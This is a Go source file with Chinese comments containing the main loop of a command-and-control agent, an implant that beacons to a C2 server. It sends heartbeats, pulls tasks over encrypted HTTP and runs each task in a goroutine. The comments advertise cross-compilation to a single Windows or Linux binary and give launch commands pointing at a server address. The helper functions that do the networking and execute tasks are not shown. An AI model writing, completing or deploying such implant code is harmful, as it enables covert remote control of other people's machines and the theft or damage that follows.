package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Go 版 C2 Agent
// 与 client/agent.py 协议完全对齐: HTTP POST /agent/{heartbeat,pull,result}
// 加密通信: none/aes-128-cbc/aes-256-cbc/xor/rc4/chacha20
// 纯 Go (CGO_ENABLED=0) → 支持 GOOS=windows/linux 交叉编译，单二进制无依赖
//
// 用法:
//   agent.exe -server http://1.2.3.4:5000 -enc-algo aes-256-cbc -enc-password "yourpass"
//   C2_SERVER=... C2_ENC_ALGO=... C2_ENC_PASSWORD=... ./agent
func main() {
	cfg = loadConfig()
	rand.Seed(time.Now().UnixNano())

	fmt.Printf("[*] C2 Agent (Go) Started - Client ID: %s\n", cfg.ClientID)
	fmt.Printf("[*] C2 Server: %s\n", cfg.C2Server)
	fmt.Printf("[*] EncAlgo: %s  Runtime: %s\n", cfg.EncAlgo, runtimeInfo())

	// 首次心跳
	heartbeat()

	lastHeartbeat := time.Now()
	heartbeatTick := time.Duration(cfg.HeartbeatSec) * time.Second
	pullTick := time.Duration(cfg.PullInterval) * time.Second

	// 信号处理: Ctrl+C 优雅退出
	stopCh := make(chan os.Signal, 1)
	signal.Notify(stopCh, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case <-stopCh:
			fmt.Println("\n[*] Exiting...")
			return
		case <-time.After(pullTick):
			tasks := pullTasks()
			for _, t := range tasks {
				if tt, ok := t["task_type"].(string); ok {
					fmt.Printf("[*] Processing task: %s\n", tt)
				}
				// 每个任务独立 goroutine 执行，不阻塞拉取循环
				go processTask(t)
			}
			// 定时重新心跳
			if time.Since(lastHeartbeat) >= heartbeatTick {
				heartbeat()
				lastHeartbeat = time.Now()
			}
		}
	}
}
